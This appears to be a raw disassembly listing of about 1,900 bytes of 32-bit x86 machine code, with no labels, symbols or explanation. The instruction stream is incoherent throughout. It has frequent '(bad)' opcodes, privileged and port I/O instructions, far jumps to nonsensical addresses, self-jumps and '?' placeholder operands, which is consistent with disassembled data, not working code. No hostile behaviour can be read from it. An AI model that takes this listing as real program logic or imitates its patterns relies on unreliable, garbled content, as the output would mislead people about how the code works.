  40ca4e:	jae    0x40ca62
  40ca50:	jo     0x40cacc
  40ca52:	stos   BYTE PTR es:[edi],al
  40ca53:	test   eax,0x8be2ed2e
  40ca58:	add    al,0x45
  40ca5a:	jbe    0x40ca04
  40ca5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca5d:	lahf   
  40ca5e:	adc    eax,0xa66e6195
  40ca63:	loope  0x40ca39
  40ca65:	sub    edi,DWORD PTR [ebp-0x57]
  40ca68:	data16 sysexit 
  40ca6b:	cmp    DWORD PTR [edx-0xf],0xffffffc5
  40ca6f:	mov    ebx,0xcce172f6
  40ca74:	mov    WORD PTR [edx-0x5],cs
  40ca77:	fld    DWORD PTR ds:0x2e469243
  40ca7d:	sub    eax,0xf3463ef7
  40ca82:	inc    edx
  40ca83:	das    
  40ca84:	push   edi
  40ca85:	pop    ecx
  40ca86:	sub    eax,DWORD PTR [esi]
  40ca88:	inc    eax
  40ca89:	add    cl,BYTE PTR [eax-0x18676868]
  40ca8f:	mov    dh,0xcd
  40ca91:	not    BYTE PTR [edx+0x2fc76110]
  40ca97:	sbb    cl,ch
  40ca99:	loope  0x40cae0
  40ca9b:	in     al,0x7c
  40ca9d:	mov    eax,ds:0xde62cc05
  40caa2:	jmp    0x40ca9a
  40caa4:	(bad)  
  40caa6:	(bad)  
  40caa7:	in     eax,0x2a
  40caa9:	rcl    BYTE PTR [esi],cl
  40caab:	inc    edx
  40caac:	mov    ds:0xba9cc603,al
  40cab1:	std    
  40cab2:	xchg   ebx,eax
  40cab3:	jmp    DWORD PTR [ebx+0x53]
  40cab6:	dec    eax
  40cab7:	test   al,0x38
  40cab9:	push   ss
  40caba:	daa    
  40cabb:	jl     0x40caa0
  40cabd:	cwde   
  40cabe:	sub    edx,0xfffffffe
  40cac1:	add    al,cl
  40cac3:	out    dx,al
  40cac4:	in     eax,0x50
  40cac6:	add    esp,DWORD PTR fs:[esi+0x7b988841]
  40cacd:	xor    DWORD PTR [esi-0x7f],ebx
  40cad0:	mov    al,ds:0xb01b0f86
  40cad5:	pop    ecx
  40cad6:	jp     0x40cb10
  40cad8:	cwde   
  40cad9:	daa    
  40cada:	push   edi
  40cadb:	into   
  40cadc:	inc    edx
  40cadd:	xchg   ecx,eax
  40cade:	xor    eax,0xea87fabe
  40cae3:	nop
  40cae4:	xchg   ecx,eax
  40cae5:	cwde   
  40cae6:	push   eax
  40cae7:	mov    ch,0x3d
  40cae9:	inc    esp
  40caea:	fadd   st,st(7)
  40caec:	sub    eax,0x557c5ccb
  40caf1:	cmp    ah,bh
  40caf3:	mov    ch,0x6f
  40caf5:	scas   eax,DWORD PTR es:[edi]
  40caf6:	out    0xb0,al
  40caf8:	js     0x40caec
  40cafa:	div    BYTE PTR [edx-0x80]
  40cafd:	mov    bh,0x74
  40caff:	je     0x40cb1c
  40cb01:	stos   DWORD PTR es:[edi],eax
  40cb02:	repz in al,0x90
  40cb05:	cmp    al,BYTE PTR [esi+0x2d320060]
  40cb0b:	addr16 push cs
  40cb0d:	add    ah,BYTE PTR [edi+0x10]
  40cb10:	xor    eax,0x3c0444a0
  40cb15:	sbb    eax,0xb519b5d9
  40cb1a:	ins    BYTE PTR es:[edi],dx
  40cb1b:	xchg   bx,ax
  40cb1d:	jp     0x40cb39
  40cb1f:	outs   dx,BYTE PTR ds:[esi]
  40cb20:	push   es
  40cb21:	or     DWORD PTR [eax-0x656032d9],ecx
  40cb27:	jae    0x40cac3
  40cb29:	push   edx
  40cb2a:	retf   0xd32
  40cb2d:	mov    edi,0x34c03ea8
  40cb32:	lock fsub DWORD PTR [edi+0x52]
  40cb36:	data16 loope 0x40cb29
  40cb39:	adc    eax,0x1b08689e
  40cb3e:	xchg   ebp,eax
  40cb3f:	aaa    
  40cb40:	add    eax,0xc8e7a515
  40cb45:	mov    al,0xc0
  40cb47:	mov    ecx,0x816fcdd
  40cb4c:	pushf  
  40cb4d:	pop    esp
  40cb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb4f:	push   es
  40cb50:	jne    0x40cb09
  40cb52:	cs in  al,0xf3
  40cb55:	retf   
  40cb56:	dec    edi
  40cb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb58:	sahf   
  40cb59:	xor    BYTE PTR [ecx],bl
  40cb5b:	pop    ecx
  40cb5c:	cdq    
  40cb5d:	ins    DWORD PTR es:[edi],dx
  40cb5e:	mov    al,0x82
  40cb60:	fisubr DWORD PTR [esp+0x13]
  40cb64:	sub    BYTE PTR [ebx-0x67],dh
  40cb67:	dec    edi
  40cb68:	stos   BYTE PTR es:[edi],al
  40cb69:	sbb    BYTE PTR [ebp+0x2b361b3a],ch
  40cb6f:	dec    esi
  40cb70:	mov    edx,ebp
  40cb72:	nop
  40cb73:	pop    edx
  40cb74:	sub    BYTE PTR [eax],dh
  40cb76:	ror    BYTE PTR [eax-0x5],0x95
  40cb7a:	call   0x7e7b:0xf020e74f
  40cb81:	or     al,0x60
  40cb83:	push   ds
  40cb84:	(bad)  
  40cb85:	jecxz  0x40cb51
  40cb87:	outs   dx,DWORD PTR ds:[esi]
  40cb88:	inc    edi
  40cb89:	mov    ds:0x2e1a3e04,al
  40cb8e:	iret   
  40cb8f:	adc    BYTE PTR [edx],0x43
  40cb92:	loope  0x40cbdc
  40cb94:	push   ebp
  40cb95:	mov    BYTE PTR [edx+0x473e0471],cl
  40cb9b:	or     DWORD PTR [esi-0x59e9188f],0x52
  40cba2:	aad    0x4a
  40cba4:	jae    0x40cbab
  40cba6:	push   0x57f7db8c
  40cbab:	ins    DWORD PTR es:[edi],dx
  40cbac:	out    dx,eax
  40cbad:	pop    ss
  40cbae:	mov    ebx,ecx
  40cbb0:	popa   
  40cbb1:	out    0x6f,al
  40cbb3:	ret    
  40cbb4:	push   es
  40cbb5:	add    al,0x2d
  40cbb7:	and    al,0xaa
  40cbb9:	and    al,0xf0
  40cbbb:	mov    DWORD PTR [esi],eax
  40cbbd:	jne    0x40cbcb
  40cbbf:	sbb    esp,DWORD PTR [esi+0xce6f692]
  40cbc5:	cmp    eax,0x387a22f3
  40cbca:	idiv   bh
  40cbcc:	cdq    
  40cbcd:	(bad)  
  40cbcf:	leave  
  40cbd0:	xchg   ecx,eax
  40cbd1:	jbe    0x40cc45
  40cbd3:	dec    edi
  40cbd4:	aaa    
  40cbd5:	sbb    al,0x67
  40cbd7:	mov    dh,0xd
  40cbd9:	and    al,0x3d
  40cbdb:	add    DWORD PTR [eax+0x7ad72da5],edx
  40cbe1:	xor    al,0x13
  40cbe3:	(bad)
  40cbe6:	jecxz  0x40cbdd
  40cbe8:	sti    
  40cbe9:	cs loop 0x40cbb3
  40cbec:	test   eax,0x8eb9466c
  40cbf1:	enter  0x6e76,0x21
  40cbf5:	adc    eax,0x447b2f32
  40cbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbfb:	dec    ecx
  40cbfc:	outs   dx,BYTE PTR ds:[esi]
  40cbfd:	add    BYTE PTR [esi-0xe],ah
  40cc00:	jmp    0x40cc00
  40cc02:	aas    
  40cc03:	sub    BYTE PTR [ebx-0x2ce11eaa],ch
  40cc09:	enter  0xcd07,0x1b
  40cc0d:	inc    ecx
  40cc0e:	repz mov dl,0x9
  40cc11:	or     BYTE PTR [ebp+0x2],bh
  40cc14:	pop    DWORD PTR cs:[ecx+esi*2+0x27]
  40cc19:	jl     0x40cc65
  40cc1b:	jmp    0x9668:0xc15ae01d
  40cc22:	lods   eax,DWORD PTR ds:[esi]
  40cc23:	pop    edi
  40cc24:	ret    0x97b5
  40cc27:	jmp    0x4d8e:0x89bd8417
  40cc2e:	dec    ebx
  40cc2f:	dec    eax
  40cc30:	sahf   
  40cc31:	mov    esp,0xaefa04a5
  40cc36:	jne    0x40cc5e
  40cc38:	retf   
  40cc39:	sbb    DWORD PTR [edx-0x1cc96dd2],0x9c3f2ce4
  40cc43:	xor    BYTE PTR [edx+0x592dedae],ah
  40cc49:	(bad)  
  40cc4a:	dec    cl
  40cc4c:	inc    esi
  40cc4d:	pushf  
  40cc4e:	stc    
  40cc4f:	inc    edi
  40cc50:	lds    esp,FWORD PTR [eax]
  40cc52:	rcl    DWORD PTR [edx],1
  40cc54:	aas    
  40cc55:	stc    
  40cc56:	ret    0x3d4e
  40cc59:	cwde   
  40cc5a:	loope  0x40cc28
  40cc5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc5e:	dec    ebx
  40cc5f:	popf   
  40cc60:	cs pop ebp
  40cc62:	out    dx,al
  40cc63:	enter  0x64c5,0x93
  40cc67:	int3   
  40cc68:	jne    0x40cca5
  40cc6a:	jge    0x40cc12
  40cc6c:	call   0x6cd9ded7
  40cc71:	js     0x40ccc9
  40cc73:	xchg   edx,eax
  40cc74:	stc    
  40cc75:	add    DWORD PTR [edx-0x744bbc2b],edx
  40cc7b:	jbe    0x40cc51
  40cc7d:	test   eax,0xb2928cf1
  40cc82:	outs   dx,DWORD PTR ds:[esi]
  40cc83:	mov    al,0xad
  40cc86:	or     ecx,DWORD PTR [esi-0x18]
  40cc89:	(bad)  
  40cc8b:	iret   
  40cc8c:	pop    ds
  40cc8d:	sbb    eax,0xf4c7c5e3
  40cc92:	xlat   BYTE PTR ds:[ebx]
  40cc93:	stc    
  40cc94:	popf   
  40cc95:	sbb    bl,BYTE PTR ds:[eax+ecx*2]
  40cc99:	push   cs
  40cc9a:	into   
  40cc9b:	inc    eax
  40cc9c:	add    DWORD PTR [edi],0xbadfec39
  40cca2:	push   ds
  40cca3:	or     al,0xd9
  40cca5:	add    BYTE PTR [ebp+0x5c96d9],0x5e
  40ccac:	and    dl,cl
  40ccae:	out    0x23,eax
  40ccb0:	lock mov DWORD PTR ds:0x7819c76,esi
  40ccb7:	xlat   BYTE PTR ds:[ebx]
  40ccb8:	ds mov ecx,0xfc2d0bd4
  40ccbe:	add    al,BYTE PTR [ebp-0x1e]
  40ccc1:	les    esp,FWORD PTR [ebp+0x1dbd3209]
  40ccc7:	pop    ecx
  40ccc8:	imul   eax,DWORD PTR ds:[ebp+0x11cc6bf4],0x3b
  40ccd0:	jg     0x40cc59
  40ccd2:	aam    0x45
  40ccd4:	adc    BYTE PTR [esi+ecx*2],bh
  40ccd7:	dec    esi
  40ccd8:	nop
  40ccd9:	jo     0x40ccc1
  40ccdb:	mov    bl,0x1a
  40ccdd:	mov    ebx,0xb8da85d1
  40cce2:	idiv   DWORD PTR [eax+0x7a]
  40cce5:	cwde   
  40cce6:	mov    gs,WORD PTR fs:[edx]
  40cce9:	add    DWORD PTR [esi+0x29],ebx
  40ccec:	inc    esp
  40cced:	push   esp
  40ccee:	inc    ebp
  40ccef:	cmp    al,BYTE PTR [edx+0x294be07e]
  40ccf5:	jb     0x40cd15
  40ccf7:	aaa    
  40ccf8:	dec    edx
  40ccf9:	sub    dl,al
  40ccfb:	dec    edi
  40ccfc:	adc    eax,edx
  40ccfe:	add    eax,DWORD PTR [ecx-0x1a]
  40cd01:	outs   dx,BYTE PTR ds:[esi]
  40cd02:	inc    edi
  40cd03:	in     al,0x6e
  40cd05:	test   DWORD PTR [ebp-0x842eb41],ebp
  40cd0b:	lds    edx,FWORD PTR [edx]
  40cd0d:	mov    edx,DWORD PTR [edi-0x377b98c1]
  40cd13:	ja     0x40cd5e
  40cd15:	lock dec edi
  40cd17:	add    esi,esp
  40cd19:	or     al,0x2d
  40cd1b:	fnsave [eax]
  40cd1d:	sub    eax,0xa5002f25
  40cd22:	(bad)  
  40cd23:	xchg   ebp,eax
  40cd24:	into   
  40cd25:	xor    ebx,eax
  40cd27:	test   al,0xc
  40cd29:	nop
  40cd2a:	(bad)  
  40cd2b:	or     edx,DWORD PTR [esi-0x6]
  40cd2e:	xchg   ebx,eax
  40cd2f:	and    esp,DWORD PTR [esi+0x14]
  40cd32:	inc    BYTE PTR [ebx+0x69155ae]
  40cd38:	xor    BYTE PTR ds:0xbddf7d05,0xb
  40cd3f:	cmp    DWORD PTR [ebp+0x66],ebx
  40cd42:	mov    ah,bh
  40cd44:	in     al,dx
  40cd45:	hlt    
  40cd46:	xor    al,0x41
  40cd48:	repnz add ah,BYTE PTR [esp+ecx*1-0x73]
  40cd4d:	sub    ebp,0xbd8339de
  40cd53:	(bad)  
  40cd54:	mov    ecx,DWORD PTR [esi+0x36258aae]
  40cd5a:	icebp  
  40cd5b:	rol    BYTE PTR [eax-0x54],0xf4
  40cd5f:	fist   WORD PTR [esi-0x24]
  40cd62:	jne    0x40cd4e
  40cd64:	mov    al,ds:0xec8f5590
  40cd69:	dec    edx
  40cd6a:	rol    DWORD PTR [edi+ebp*4],1
  40cd6d:	adc    bl,BYTE PTR [bx-0x4ec8]
  40cd72:	shl    BYTE PTR [ecx+0x77fa7a49],1
  40cd78:	adc    DWORD PTR [ecx+0x13],esi
  40cd7b:	icebp  
  40cd7c:	aam    0x8
  40cd7e:	std    
  40cd7f:	mov    DWORD PTR [esi-0x2068a166],eax
  40cd85:	xchg   esi,eax
  40cd86:	out    0x41,eax
  40cd88:	mov    esi,0xb17967c7
  40cd8d:	pop    es
  40cd8e:	adc    BYTE PTR [ecx-0xf3a48ae],cl
  40cd94:	mov    edi,0xcf285c1d
  40cd99:	mov    dl,0x18
  40cd9b:	push   ds
  40cd9c:	(bad)  
  40cd9d:	(bad)  
  40cd9e:	inc    BYTE PTR [ebp+0x725cd9de]
  40cda4:	out    dx,eax
  40cda5:	test   BYTE PTR [ebp+0x3b2f0379],dl
  40cdab:	das    
  40cdac:	lahf   
  40cdad:	inc    ebp
  40cdae:	pop    edx
  40cdaf:	scas   al,BYTE PTR es:[edi]
  40cdb0:	xor    al,BYTE PTR ds:[esi-0x5cd493e6]
  40cdb7:	mov    DWORD PTR [edi],esp
  40cdb9:	fnstenv [ecx+0x6a]
  40cdbc:	adc    edx,0x4d
  40cdbf:	inc    ebp
  40cdc0:	jl     0x40cde1
  40cdc2:	xchg   ebp,eax
  40cdc3:	cs pushf 
  40cdc5:	pop    esi
  40cdc6:	lds    edi,FWORD PTR [ecx-0x6d]
  40cdc9:	cs dec edx
  40cdcb:	(bad)  
  40cdcd:	fidiv  WORD PTR [ebx-0xf]
  40cdd0:	mov    edx,DWORD PTR [ebx-0x44]
  40cdd3:	xchg   edi,eax
  40cdd4:	pusha  
  40cdd5:	jmp    0xcdc7:0x8036b5f9
  40cddc:	test   BYTE PTR [eax],bl
  40cdde:	cld    
  40cddf:	data16 loopne 0x40cd6c
  40cde2:	cmp    esp,0x74a551ba
  40cde8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40cdea:	pop    ss
  40cdeb:	mov    esi,0x70380040
  40cdf0:	push   ebx
  40cdf1:	push   edi
  40cdf2:	and    DWORD PTR [esi+0x46],edx
  40cdf5:	adc    DWORD PTR [ecx-0x3c],ebx
  40cdf8:	cmp    edx,0xffffffb5
  40cdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdfc:	cmp    BYTE PTR [edi+0x42],ch
  40cdff:	out    0x24,al
  40ce01:	add    ebp,edx
  40ce03:	add    bl,bl
  40ce05:	mov    dl,0x4d
  40ce07:	lea    edx,[ecx]
  40ce09:	mov    edi,0x5d946d29
  40ce0e:	add    BYTE PTR [esi],bl
  40ce10:	and    esi,DWORD PTR [eax+eax*4+0x4877aa09]
  40ce17:	sar    BYTE PTR [edx-0x36187813],cl
  40ce1d:	inc    esi
  40ce1e:	dec    esi
  40ce1f:	sti    
  40ce20:	rcl    DWORD PTR [eax+0x41],cl
  40ce23:	cli    
  40ce24:	call   0xbfdd:0x29d368ec
  40ce2b:	dec    esp
  40ce2c:	xchg   BYTE PTR [ecx+0x4d39492],ch
  40ce32:	mov    esp,DWORD PTR [edx]
  40ce34:	dec    esp
  40ce35:	std    
  40ce36:	sbb    eax,0xaeadf61a
  40ce3b:	inc    ebx
  40ce3c:	(bad)  
  40ce3d:	xor    DWORD PTR [esi],edx
  40ce3f:	sbb    esp,DWORD PTR [esi+0x6d26712]
  40ce45:	cmp    ah,BYTE PTR ds:0xd7b6ea47
  40ce4b:	inc    edx
  40ce4c:	or     esi,DWORD PTR [edx-0x72]
  40ce4f:	push   edx
  40ce50:	jb     0x40ce50
  40ce52:	(bad)  
  40ce53:	xchg   DWORD PTR [esi+0x4d],ecx
  40ce56:	cwde   
  40ce57:	les    eax,FWORD PTR [ebx+0x6c6b5628]
  40ce5d:	cmp    al,0xf8
  40ce5f:	cs mov edi,0x222bd0d8
  40ce65:	rcl    BYTE PTR [ecx+0x34ea2f22],cl
  40ce6b:	jmp    0x820d:0x757e1c90
  40ce72:	lods   eax,DWORD PTR ds:[esi]
  40ce73:	mov    dh,BYTE PTR [ecx+0x53093997]
  40ce79:	sub    esp,edi
  40ce7b:	in     al,dx
  40ce7c:	add    DWORD PTR [esi],edx
  40ce7e:	mov    eax,ds:0x2840fd2e
  40ce83:	retf   0xcc5
  40ce86:	imul   ebp,DWORD PTR [eax+0x58e0168a],0xa20cd93f
  40ce90:	mov    ecx,0x6184ab6c
  40ce95:	mov    esi,?
  40ce97:	cmp    BYTE PTR [ebx],bl
  40ce99:	mov    ah,0xd
  40ce9b:	sub    BYTE PTR [ebp-0x5460e6e],cl
  40cea1:	jp     0x40cec1
  40cea3:	and    al,BYTE PTR [edx+esi*1+0x1aef5f4c]
  40ceaa:	push   esp
  40ceab:	and    eax,0x66270bd8
  40ceb0:	nop
  40ceb1:	mov    esi,0x14ee9398
  40ceb6:	ret    
  40ceb7:	fild   DWORD PTR ds:0xa9c47a03
  40cebd:	pop    ds
  40cebe:	mov    bl,0x9f
  40cec0:	jmp    0x40ce59
  40cec2:	inc    eax
  40cec3:	or     ax,0x18f7
  40cec7:	aad    0x32
  40cec9:	cmp    DWORD PTR [ebx+eax*2-0x33],esp
  40cecd:	adc    eax,0x40bc359b
  40ced2:	xchg   ebx,eax
  40ced3:	xchg   esp,eax
  40ced4:	xchg   BYTE PTR [ebp+0x6b],ch
  40ced7:	add    al,dl
  40ced9:	cmp    BYTE PTR [ecx],dh
  40cedb:	and    al,0x8b
  40cedd:	mov    dl,BYTE PTR [esi+eax*4-0x13a2b672]
  40cee4:	and    bl,BYTE PTR [edi-0x64]
  40cee7:	imul   eax,eax,0x49
  40ceea:	mov    esi,0x6f46b8fb
  40ceef:	or     al,0x79
  40cef1:	je     0x40ce74
  40cef3:	mov    ?,WORD PTR [edi+0x59]
  40cef6:	lock std 
  40cef8:	xor    BYTE PTR [ebp-0x13bc9983],cl
  40cefe:	test   BYTE PTR [esi-0x46e5eb22],0xed
  40cf05:	icebp  
  40cf06:	arpl   WORD PTR [ebx],cx
  40cf08:	sbb    BYTE PTR [ecx+0x4d],0xf2
  40cf0c:	mov    al,ds:0xf11defda
  40cf11:	sub    al,0x31
  40cf13:	outs   dx,DWORD PTR ds:[esi]
  40cf14:	sbb    ebx,edi
  40cf16:	dec    eax
  40cf17:	loop   0x40ceab
  40cf19:	inc    ebp
  40cf1a:	test   eax,0x20acd5db
  40cf1f:	xor    BYTE PTR [eax+0x75],bh
  40cf22:	dec    esp
  40cf23:	mov    ebx,0x725ec4e9
  40cf28:	into   
  40cf29:	cmp    al,0xa6
  40cf2b:	mov    al,ch
  40cf2d:	push   esp
  40cf2e:	push   ebp
  40cf2f:	out    dx,al
  40cf30:	inc    ebx
  40cf31:	popf   
  40cf32:	xor    DWORD PTR [ecx],esi
  40cf34:	add    ah,BYTE PTR [ecx+eiz*4+0x284c9b0a]
  40cf3b:	fs clc 
  40cf3d:	enter  0xad6b,0xef
  40cf41:	pop    edi
  40cf42:	dec    ecx
  40cf43:	dec    edx
  40cf44:	in     al,dx
  40cf45:	ds cld 
  40cf47:	repz sub dl,ah
  40cf4a:	(bad)  
  40cf4b:	hlt    
  40cf4c:	jge    0x40cef4
  40cf4e:	(bad)  
  40cf50:	sahf   
  40cf51:	xor    al,0x38
  40cf53:	shl    BYTE PTR [edx+esi*4-0x257b7c23],0x14
  40cf5b:	sub    al,0xd
  40cf5d:	cmp    ah,BYTE PTR [eax-0x1c]
  40cf60:	mov    esp,DWORD PTR [edi-0x141c1a29]
  40cf66:	mov    dl,dl
  40cf68:	mov    eax,ds:0x32fff945
  40cf6d:	call   0x7bae12b9
  40cf72:	mov    bl,0x6a
  40cf74:	aaa    
  40cf75:	dec    BYTE PTR [ebp+0xf]
  40cf78:	shr    DWORD PTR [ebp+0x4c769697],cl
  40cf7e:	jne    0x40cf7d
  40cf80:	lahf   
  40cf81:	popf   
  40cf82:	mov    bh,BYTE PTR [ecx+0x3aeffad8]
  40cf88:	cmc    
  40cf89:	in     eax,dx
  40cf8a:	jmp    0xc9b9d92a
  40cf8f:	push   es
  40cf90:	ins    DWORD PTR es:[edi],dx
  40cf91:	dec    esi
  40cf92:	outs   dx,BYTE PTR ds:[esi]
  40cf93:	sahf   
  40cf94:	xchg   edi,eax
  40cf95:	mov    bh,0x13
  40cf97:	push   ds
  40cf98:	rol    BYTE PTR [eax+0xe3dc90],0x7e
  40cf9f:	xor    DWORD PTR [esp+eax*8+0x19c1b3cc],edi
  40cfa6:	mov    WORD PTR [esi+0x45],?
  40cfa9:	out    dx,eax
  40cfaa:	and    eax,0xc49d9e03
  40cfaf:	sub    esi,eax
  40cfb1:	into   
  40cfb2:	and    ebx,DWORD PTR [edi+0x42397956]
  40cfb8:	scas   al,BYTE PTR es:[edi]
  40cfb9:	jmp    0x40cf43
  40cfbb:	retf   0x2934
  40cfbe:	and    bh,BYTE PTR [ecx+0x7aaf5b55]
  40cfc4:	pop    es
  40cfc5:	repnz adc dl,al
  40cfc8:	cli    
  40cfc9:	(bad)  
  40cfca:	mov    WORD PTR [ebp+0x39de7d8],fs
  40cfd0:	xor    eax,DWORD PTR [esi]
  40cfd2:	mov    bl,0x8b
  40cfd4:	jp     0x40cf9e
  40cfd6:	dec    eax
  40cfd7:	fcomp  QWORD PTR [edi]
  40cfd9:	xchg   ebp,eax
  40cfda:	mov    WORD PTR [esi+0x6cbdfd0a],gs
  40cfe0:	push   ss
  40cfe1:	fsubr  QWORD PTR [edi]
  40cfe3:	xchg   edi,eax
  40cfe4:	addr16 xchg ebx,eax
  40cfe6:	mov    ah,0x65
  40cfe8:	aas    
  40cfe9:	call   0x87a0bf07
  40cfee:	mov    ds:0x46b76aeb,al
  40cff3:	cmp    cl,bl
  40cff5:	mov    eax,ebp
  40cff7:	mov    ah,BYTE PTR [ebp+0x15]
  40cffa:	out    dx,al
  40cffb:	fisttp WORD PTR [di+0x16]
  40cfff:	out    0x77,al
  40d001:	inc    edx
  40d002:	dec    esi
  40d003:	addr16 mov ebp,0x245cf6d3
  40d009:	fwait
  40d00a:	test   DWORD PTR [ebx+0x40a77cfa],0xbfeccf1d
  40d014:	imul   ebx,DWORD PTR [eax],0x4621a0a0
  40d01a:	push   edx
  40d01b:	inc    esp
  40d01c:	jmp    0x40d091
  40d01e:	mov    ds:0x85d6c0a7,al
  40d023:	inc    esp
  40d024:	adc    BYTE PTR [edx-0x27945f88],0x4c
  40d02b:	jb     0x40d06c
  40d02d:	fbstp  TBYTE PTR [ecx+0x46]
  40d030:	ins    DWORD PTR es:[edi],dx
  40d031:	dec    esp
  40d032:	xchg   esi,eax
  40d033:	push   0x7bd8be12
  40d038:	bound  edx,QWORD PTR ss:[bp+si+0x4867]
  40d03e:	out    0x5b,eax
  40d040:	or     al,0xc1
  40d042:	mov    edx,0xbf96aab6
  40d047:	test   esi,esp
  40d049:	aaa    
  40d04a:	or     al,0xd
  40d04c:	adc    DWORD PTR [ebx+0x68ff36bd],esi
  40d052:	dec    ebp
  40d053:	sub    ah,ch
  40d055:	loop   0x40d018
  40d057:	loop   0x40d07d
  40d059:	mov    al,0x23
  40d05b:	xor    ebp,0xcfa5d48e
  40d061:	mov    eax,0x83c70cc7
  40d066:	into   
  40d067:	ret    0xbf8f
  40d06a:	repnz pop ebp
  40d06c:	mov    ds:0x64ac9dda,al
  40d071:	adc    eax,0x4e7c658a
  40d076:	adc    esi,ebx
  40d078:	cdq    
  40d079:	jo     0x40d0c4
  40d07b:	sbb    DWORD PTR [edx+0x4ea3a343],ecx
  40d081:	and    esi,DWORD PTR [ebx+0x73]
  40d084:	pop    esi
  40d085:	out    dx,al
  40d086:	push   eax
  40d087:	retf   
  40d088:	push   cs
  40d089:	je     0x40d077
  40d08b:	mov    dl,0xa1
  40d08d:	fs push edi
  40d08f:	aam    0x17
  40d091:	fdivp  st(2),st
  40d093:	sbb    eax,0x7bdaee89
  40d098:	fcomp  DWORD PTR [ecx+0x55]
  40d09b:	(bad)  
  40d09c:	jge    0x40d033
  40d09e:	scas   eax,DWORD PTR es:[edi]
  40d09f:	push   es
  40d0a0:	ret    0x2dec
  40d0a3:	xor    eax,0xeafec086
  40d0a8:	fcomp  DWORD PTR [ebx]
  40d0aa:	jge    0x40d098
  40d0ac:	add    eax,0xc0ae86c
  40d0b1:	push   0x67
  40d0b3:	aas    
  40d0b4:	shl    DWORD PTR cs:[edi+0x4],cl
  40d0b8:	cmp    dh,al
  40d0ba:	dec    ebx
  40d0bb:	imul   eax,DWORD PTR [ebx+0x61],0x10
  40d0bf:	mov    ?,ebx
  40d0c1:	loope  0x40d0c5
  40d0c3:	push   0x3
  40d0c5:	(bad)  
  40d0c6:	xchg   esi,eax
  40d0c7:	(bad)
  40d0cb:	adc    BYTE PTR [ebx-0x62bea520],dl
  40d0d1:	xchg   ebx,eax
  40d0d2:	das    
  40d0d3:	rol    BYTE PTR [esi+0x7],cl
  40d0d6:	inc    ebp
  40d0d7:	xchg   ebx,eax
  40d0d8:	clc    
  40d0d9:	loop   0x40d09d
  40d0db:	hlt    
  40d0dc:	aad    0x24
  40d0de:	jp     0x40d0fc
  40d0e0:	and    dl,BYTE PTR ds:0x1c213179
  40d0e6:	sub    eax,DWORD PTR [edi]
  40d0e8:	aam    0xa8
  40d0ea:	sbb    eax,esp
  40d0ec:	fstp   DWORD PTR [esp+ebp*8-0xe]
  40d0f0:	or     al,0xe3
  40d0f2:	or     bh,BYTE PTR [esi]
  40d0f4:	in     al,0x8d
  40d0f6:	add    eax,0x745b03fe
  40d0fb:	adc    DWORD PTR [ebx],edi
  40d0fd:	adc    dh,BYTE PTR [ebx-0x5a0855b4]
  40d103:	cmp    DWORD PTR [eax+0x344524ba],esp
  40d109:	cmp    DWORD PTR [esi],0xb18072d8
  40d10f:	imul   esi,eax,0xffffffee
  40d112:	scas   al,BYTE PTR es:[edi]
  40d113:	stos   BYTE PTR es:[edi],al
  40d114:	stos   BYTE PTR es:[edi],al
  40d115:	and    DWORD PTR [ebx+0x1bf9b3f8],esp
  40d11b:	sbb    dl,BYTE PTR [edi]
  40d11d:	clc    
  40d11e:	rcl    DWORD PTR [edi-0x5b],0x90
  40d122:	lods   eax,DWORD PTR ds:[esi]
  40d123:	jb     0x40d0f2
  40d125:	test   eax,ecx
  40d127:	nop
  40d128:	retf   0x7454
  40d12b:	faddp  st(2),st
  40d12d:	fs mov bh,0x5f
  40d130:	aam    0x4
  40d132:	(bad)  
  40d134:	xchg   esi,eax
  40d135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d136:	loope  0x40d149
  40d138:	adc    eax,0x1e7f5e0d
  40d13d:	in     al,dx
  40d13e:	int    0xee
  40d140:	adc    eax,0x97a5276c
  40d145:	nop
  40d146:	aas    
  40d147:	loopne 0x40d18f
  40d149:	rol    DWORD PTR [edx-0x226bdf8e],cl
  40d14f:	add    al,0x52
  40d151:	xchg   ebx,eax
  40d152:	jno    0x40d0e0
  40d154:	add    edx,eax
  40d156:	es xchg ebp,eax
  40d158:	inc    edx
  40d159:	ins    DWORD PTR es:[edi],dx
  40d15a:	lea    ecx,[ecx-0x3e5d2dc7]
  40d160:	mov    es,WORD PTR [ecx-0x17]
  40d163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d164:	sbb    DWORD PTR [ebx],ecx
  40d166:	(bad)  
  40d168:	loop   0x40d10d
  40d16a:	adc    ecx,esi
  40d16c:	push   ss
  40d16d:	lock cmp bl,BYTE PTR [edx]
  40d170:	lods   al,BYTE PTR ds:[esi]
  40d171:	lods   eax,DWORD PTR ds:[esi]
  40d172:	mov    cl,0x1
  40d174:	push   edx
  40d175:	xor    eax,0x6b62e3bb
  40d17a:	daa    
  40d17b:	inc    edi
  40d17c:	cmc    
  40d17d:	fistp  WORD PTR [ebp+0x2b]
  40d180:	and    al,0xd6
  40d183:	push   cs
  40d184:	cmp    BYTE PTR [esi],al
  40d186:	dec    eax
  40d187:	ds dec esi
  40d189:	xor    ecx,DWORD PTR fs:[ebx-0x70405aba]
  40d190:	xor    al,0x8c
  40d192:	fcmovb st,st(3)
  40d194:	push   ebx
  40d195:	cmp    eax,0x5ae54dec
  40d19a:	into   
  40d19b:	out    dx,al
  40d19c:	add    esi,esp
  40d19e:	ret    0x5d68
  40d1a1:	pop    esi
  40d1a2:	dec    ecx
  40d1a3:	test   BYTE PTR [edx-0x7f40b02],dh
  40d1a9:	pop    esi
  40d1aa:	mov    al,ds:0x6746ea07
  40d1af:	js     0x40d1cc
  40d1b1:	mov    WORD PTR ds:0x9b3d203e,gs
  40d1b7:	lods   eax,DWORD PTR ds:[esi]
  40d1b8:	push   ebp
  40d1b9:	inc    ebx
  40d1ba:	push   ebx
  40d1bb:	into   
  40d1bc:	popf   
  40d1bd:	iret   
  40d1be:	aad    0x2c
  40d1c0:	fcom   st(1)
  40d1c2:	pop    ebx
  40d1c3:	ja     0x40d1f9
